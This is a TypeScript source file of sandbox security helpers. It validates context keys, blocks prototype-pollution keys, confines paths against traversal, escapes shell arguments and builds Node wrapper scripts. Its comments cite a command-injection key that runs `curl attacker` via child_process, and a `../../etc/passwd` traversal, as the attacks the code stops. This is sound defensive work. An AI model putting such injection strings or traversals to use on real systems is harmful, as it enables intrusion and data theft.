import type { ExecuteOptions } from './types.js';

/** Valid JavaScript identifier pattern. Rejects injection via context keys. */
const JS_IDENTIFIER = /^[a-zA-Z_$][a-zA-Z0-9_$]*$/;

/** Dangerous identifiers that could cause prototype pollution or semantic hazards. */
const DANGEROUS_KEYS = new Set([
  '__proto__', '__proto', 'constructor', 'prototype',
  '__defineGetter__', '__defineSetter__', '__lookupGetter__', '__lookupSetter__',
]);

/**
 * Validate that all context keys are safe JavaScript identifiers.
 *
 * Prevents code injection via context keys like:
 * `"x=1;require('child_process').execSync('curl attacker');//"`
 *
 * Also rejects prototype-pollution-prone identifiers like `__proto__`, `constructor`.
 *
 * @throws If any key is not a valid JS identifier or is a dangerous identifier.
 */
function validateContextKeys(context: Record<string, unknown>): void {
  for (const key of Object.keys(context)) {
    if (!JS_IDENTIFIER.test(key)) {
      throw new Error(`Invalid context key "${key}" — must be a valid JavaScript identifier`);
    }
    if (DANGEROUS_KEYS.has(key)) {
      throw new Error(`Dangerous context key "${key}" — prototype-pollution risk`);
    }
  }
}

/**
 * Confine a path within a base directory. Rejects traversal attempts.
 *
 * Used by Docker and E2B file/git access to prevent `../../etc/passwd`.
 *
 * @param basePath - The allowed base path (e.g., `/sandbox`).
 * @param userPath - The user-provided relative path.
 * @returns The safe absolute path.
 * @throws If the path escapes the base directory.
 */
export function confinePath(basePath: string, userPath: string): string {
  // Reject null bytes
  if (userPath.includes('\0')) {
    throw new Error(`Path contains null bytes: ${userPath}`);
  }
  // Normalize backslashes to forward slashes (prevent Windows-style traversal)
  const normalized = userPath.replace(/\\/g, '/');
  // Reject absolute paths — must be relative to basePath
  if (normalized.startsWith('/')) {
    throw new Error(`Absolute path not allowed: ${userPath}`);
  }
  // Normalize: collapse .., resolve
  const parts = normalized.split('/').filter(Boolean);
  const resolved: string[] = [];
  for (const part of parts) {
    if (part === '..') {
      if (resolved.length === 0) {
        throw new Error(`Path escapes base directory: ${userPath}`);
      }
      resolved.pop();
    } else if (part !== '.') {
      resolved.push(part);
    }
  }
  const joined = resolved.join('/');
  return joined ? `${basePath}/${joined}` : basePath;
}

/**
 * Shell-escape a string for safe interpolation into shell commands.
 *
 * Wraps in single quotes and escapes embedded single quotes.
 */
export function shellEscape(s: string): string {
  if (s.includes('\0')) {
    throw new Error('Shell argument contains null bytes');
  }
  // Reject control characters (0x01-0x1F except tab 0x09) — newlines break
  // single-quote boundaries, other control chars are never valid in paths.
  // eslint-disable-next-line no-control-regex
  if (/[\x00-\x08\x0a-\x1f]/.test(s)) {
    throw new Error('Shell argument contains control characters');
  }
  return `'${s.replace(/'/g, "'\\''")}'`;
}

/**
 * Build a self-contained Node.js script for process-level or container execution.
 *
 * Used by all non-V8-isolate plugins (anthropic-sr, landlock, docker, e2b).
 * Provides:
 * - `console.log/error/warn` capture to `__logs` array
 * - `hostCall()` stub that throws (no IPC bridge in V1)
 * - Context variable injection (validated for safe JS identifiers)
 * - Structured JSON output on stdout
 *
 * @param code - The user code to execute.
 * @param options - Execution options (context variables).
 * @returns A complete Node.js script string.
 * @throws If any context key is not a valid JS identifier.
 */
export function buildScript(
  code: string,
  options: ExecuteOptions | undefined,
): string {
  const context = options?.context ?? {};
  validateContextKeys(context);

  const contextEntries = Object.entries(context);
  const contextDecls = contextEntries
    .map(([k, v]) => `const ${k} = ${JSON.stringify(v)};`)
    .join('\n');

  return `
const __logs = [];
const console = {
  log: (...args) => __logs.push(args.map(a => typeof a === 'string' ? a : JSON.stringify(a)).join(' ')),
  error: (...args) => __logs.push(args.map(a => typeof a === 'string' ? a : JSON.stringify(a)).join(' ')),
  warn: (...args) => __logs.push(args.map(a => typeof a === 'string' ? a : JSON.stringify(a)).join(' ')),
};
async function hostCall(name, args) {
  throw new Error("hostCall requires IPC bridge — not available in process-level sandbox V1");
}
${contextDecls}
(async () => {
  try {
    const __result = await (async () => { ${code} })();
    process.stdout.write(JSON.stringify({ __result, __logs }));
  } catch (err) {
    process.stdout.write(JSON.stringify({ __error: err.message || String(err), __logs }));
    process.exit(1);
  }
})();
`.trim();
}

/**
 * Parse structured JSON output from a buildScript-generated script.
 *
 * Returns parsed result or null if not valid structured output.
 */
export function parseScriptOutput(stdout: string): {
  result?: unknown;
  error?: string;
  logs: string[];
} | null {
  const trimmed = stdout.trim();
  if (!trimmed) return null;
  try {
    const output = JSON.parse(trimmed);
    if (typeof output !== 'object' || output === null) return null;
    const logs: string[] = output.__logs ?? [];
    if (output.__error) {
      return { error: output.__error, logs };
    }
    return { result: output.__result, logs };
  } catch {
    return null;
  }
}

/**
 * Parse structured output from an execFile error (non-zero exit).
 *
 * execFile errors include stdout/stderr properties — try to extract
 * our structured JSON from stdout even on failure.
 */
export function parseExecError(err: unknown): {
  error?: string;
  logs: string[];
} | null {
  if (err && typeof err === 'object' && 'stdout' in err) {
    const errStdout = (err as { stdout: string }).stdout?.trim();
    if (errStdout) {
      const parsed = parseScriptOutput(errStdout);
      if (parsed) return { error: parsed.error, logs: parsed.logs };
    }
  }
  return null;
}
